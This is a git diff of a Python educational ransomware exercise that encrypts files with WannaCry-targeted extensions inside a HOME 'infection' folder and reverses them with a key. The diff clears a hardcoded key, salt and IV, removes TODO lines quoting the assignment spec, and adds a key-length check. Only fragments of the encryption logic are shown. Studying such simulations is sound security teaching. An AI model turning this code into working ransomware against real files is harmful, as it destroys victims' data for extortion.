@@ -6,11 +6,11 @@ from pathlib import Path
 from colorama import Fore, Style
 import os
 
-KEY = b'123hellowOrld123'
+KEY = ""
 # os.urandom(16+)
-SALT = b'\xbeRz\x1a\xc5T[\xef\x80\xbd\xc6\x88\x19\x06\x9d\xca'
+SALT = b''
 # os.urandom(12)
-IV = b'W\xf4\xb3\xa9\x05\xa4\xe7\xdf\xd9\xae\x9e\xa0'
+IV = b''
 EXTENSION = [
     ".der", ".pfx", ".key", ".crt", ".csr", ".p12", ".pem", ".odt", ".ott", ".sxw", ".stw", ".uot", ".3ds", ".max", ".3dm",
     ".ods", ".ots", ".sxc", ".stc", ".dif", ".slk", ".wb2", ".odp", ".otp", ".sxd", ".std", ".uop", ".odg", ".otg", "sxm",
@@ -40,28 +40,6 @@ EPILOG = '''\
 • This program targets common file extensions associated with ransomware like WannaCry.
 -----------------------------------------------------------------------------------------------------------'''
 
-#TODO • It must be developed for the Linux platform.
-#       option "–help" or "-h" to display the help.
-#       option "–version" or "-v" to show the version of
-#       option "–reverse" or "-r" followed by the key entered as an argument to reverse the infection.
-#       option is indicated "–silent" or "-s", in which case the program will not produce any output.
-#TODO • The program have to handle errors and will not stop unexpectedly in any case.
-
-#TODO • It must only work in a folder called infection in the user’s HOME directory.
-#TODO • The program will only act on files whose extensions have been affected by Wannacry
-#TODO • The program have to encrypt the contents of the files in this folder using a key
-#TODO • Files must be encrypted with a known algorithm of your choice, which is considered secure.
-#TODO • The program must rename all the files in the mentioned folder adding the ".ft" extension.
-#TODO • If they already have this extension, they will not be renamed.
-#TODO • The key with which the files are encrypted will be at least 16 characters long.
-#TODO • The program must be able to do the reverse operation using the encryption key in order to restore the files to their original state.
-
-#TODO • You must add a file of maximum 50 lines called README.md to the root of your
-#TODO repository. This file should contain instructions for use and, if necessary, for compilation.
-#TODO • You must add to the root of your repository a Makefile to configure the files so that
-#TODO the program can be run.
-#TODO • In any case, you must include all the source code of the program.
-
 def main() -> int:
     try:
         args = arguments_parser()
@@ -73,7 +51,10 @@ def main() -> int:
                 return error("Invalid key format.", 1)
             recusive_directory_and(decryption, called_path, args.silent, args.reverse.encode('utf-8'))
         else:
-            recusive_directory_and(encryption, called_path, args.silent, args.key.encode('utf-8') if args.key else KEY)
+            key = args.key if args.key else KEY
+            if len(key) < 16:
+                return error("Invalid key format.", 1)
+            recusive_directory_and(encryption, called_path, args.silent, key.encode('utf-8'))
     except Exception as e:
         return error(e, 1)
     except KeyboardInterrupt:
@@ -127,7 +108,7 @@ def decryption(file: Path, key: str, silent: bool):
             file_name = str(file.absolute())[:-3];
             file.rename(file_name)
             if not silent:
-                print(f"{Fore.BLUE}[encrytped] {Fore.RED}{file.name}{Style.RESET_ALL} -> {Fore.GREEN}{file.name[:-3]}{Style.RESET_ALL}")
+                print(f"{Fore.BLUE}[decrytped] {Fore.RED}{file.name}{Style.RESET_ALL} -> {Fore.GREEN}{file.name[:-3]}{Style.RESET_ALL}")
     except Exception as e:
         pass
     return
